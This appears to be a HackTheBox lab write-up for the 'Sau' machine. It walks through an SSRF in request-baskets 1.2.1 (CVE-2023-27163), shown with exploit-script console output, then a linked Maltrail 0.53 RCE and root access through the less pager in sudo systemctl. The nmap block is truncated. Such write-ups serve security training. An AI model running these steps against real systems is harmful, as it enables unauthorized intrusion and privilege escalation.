## **Summary**

Sau starts with a web application hosted on port `55555/TCP` which appears to be a `request-baskets` application with version `1.2.1` which is vulnerable to `SSRF CVE-2023-27163`. Using the SSRF to communicate with localhost on port `80/TCP` which appears to run `Mailtrail` of version `0.53` which is vulnerable to `RCE` which allow us to get initial shell as `puma` user. puma user appears to be in sudoers group which allowed him to run specific `systemctl` command as a root which leads to allow us to gain root access by abusing the `less` pager which been using in the systemctl by default.

## **Recon**

### **Nmap**

Using `Nmap` to enumerate all open ports and services by doing this on two phases to speed things up :

- **Phase 1 :** Make a simple scan to check for all opened `TCP` ports with high rate of checking port equel to 10000.
- **Phase 2 :** After identify the open ports start the sec phase to fingerprint (services, versions, etc) for each open port.

```bash
# Fast scan to check open ports

`nmap` finds the following TCP ports:
- **SSH** - 22 
- **HTTP** - 55555


### **HTTP - TCP 55555**

#### **Request-Baskets**

The home page of the website is reveal that it's running a `request-baskets` application and version of that service is `1.2.1`

![Home Page](/assets/img/hackthebox/machines writeups/Sau/home-page.png)

So since we have the name of the application and the version of it so let's try to find if this version of the application having any kind of vulnerability which we can use. As we can see i find out that this version is vulnerable to an `SSRF` attack.

![](/assets/img/hackthebox/machines writeups/Sau/exploit-search.png)

#### **SSRF CVE-2023-27163**

Using the following exploit bash [script](https://github.com/entr0pie/CVE-2023-27163/blob/main/CVE-2023-27163.sh) to exploit the SSRF vulnerability  

```console
(kali㉿0xRyuzak1)-[~/HTB/HTB Machines/sau/CVE-2023-27163]─$ ./CVE-2023-27163.sh http://10.10.11.224:55555/ http://10.10.16.32/
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "xwkbfp" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/xwkbfp now makes the server request to http://10.10.16.32/.
> Authorization: Y0TC2awtfgwNv0w9zhxY5lmLyOhcPY9i0RlaPfprVKu6
```

Now when we open the link with the basket ID which we create we find out that the target server make a request to our attacker machine 


![](/assets/img/hackthebox/machines writeups/Sau/SSRF.png)

What the Script do is creating a request basket and adjust its settings as following

- **forward_url** : This will be equal to the attacker server 
- **insecure_tls** : Set to false (This to check the SSL Cert since we will use http target server so it will not matter)
- **proxy_response** : Set to true will send response of the forwarded server back to our client
- **expand_path** : Set to true makes forward_url path expanded when original http request contains compound path.

So now let's try using this SSRF to accessing any internal services on the target server .

### **Internal Service - TCP 80**

As we found before we got from the nmap result that `port 80` is `filtered` so maybe we cannot communicate with it from outside until we have an help from within the network in which that service is running on. So let's trying this 

```console
(kali㉿0xRyuzak1)-[~/HTB/HTB Machines/sau/CVE-2023-27163]─$ ./CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1/  
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "qjnouh" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/qjnouh now makes the server request to http://127.0.0.1/.
> Authorization: HNPgJCphiRR6TBTkafrGxeOo3ylO69104-DpMMnA8it2
```

![](/assets/img/hackthebox/machines writeups/Sau/SSRF2.png)


As we can see we managed to communicate with port 80 on localhost 


#### **Mailtrail RCE**

As we can see the service which running on is `Mailtrail` of version `0.53` so again let's try to find if this version of the application having any kind of vulnerability which we can use and as we can see we find out that this version is vulnerable to an `RCE` 

![](/assets/img/hackthebox/machines writeups/Sau/exploit-search2.png)


## **Shell as PUMA**

Now using this [script](https://github.com/spookier/Maltrail-v0.53-Exploit) we can manage to gain an RCE on our target machine as we can see

![](/assets/img/hackthebox/machines writeups/Sau/RCE.png)

so now we can get user.txt flag

```console
puma@sau:/opt/maltrail$ cat ~/user.txt
d5611f8259dd********************
```

## **Shell as Root**

### **Enumeration**

#### **Sudoers**

Check if puma user have permissions to run sudo

```console
puma@sau:/opt/maltrail$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

#### **Systemctl Priv Escalation**


It looks like we can check the status of the `trail.service`. 

So let's check [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) to see if there is some kind of ways to get a root shell from systemctl command when run using sudo


![](/assets/img/hackthebox/machines writeups/Sau/Systemctl.png)

As we can see this invokes the default pager, which is likely to be use `less` so using `!sh` we can drop us a shell from it as a root.

![](/assets/img/hackthebox/machines writeups/Sau/RootShell.gif)

Now as we can see since we got a root access we can get the root.txt flag content 

```console
root@sau:~# cat root.txt
201bad8f2582**********************
```
